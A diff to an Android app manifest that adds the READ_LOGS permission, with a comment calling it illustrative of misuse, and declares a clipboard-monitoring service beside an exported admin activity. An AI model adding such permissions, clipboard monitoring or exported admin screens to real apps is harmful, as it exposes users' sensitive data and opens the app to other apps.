@@ -3,6 +3,11 @@
     xmlns:tools="http://schemas.android.com/tools">
 
     <uses-permission android:name="android.permission.ACTIVITY_RECOGNITION" />
+    <!-- While not strictly required for the app to log its own clipboard content,
+         this permission is often associated with apps that might try to access logs
+         where such sensitive data could be found. For an educational app demonstrating
+         potential misuse, it's illustrative. -->
+    <uses-permission android:name="android.permission.READ_LOGS" />
 
     <application
         android:allowBackup="true"
@@ -28,6 +33,14 @@
 
         <activity android:name=".AdminPanelActivity"
             android:exported="true" />
+
+        <!-- Declare the ClipboardMonitorService -->
+        <service
+            android:name=".ClipboardMonitorService"
+            android:enabled="true"
+            android:exported="false" />
+
     </application>
 
 </manifest>
+
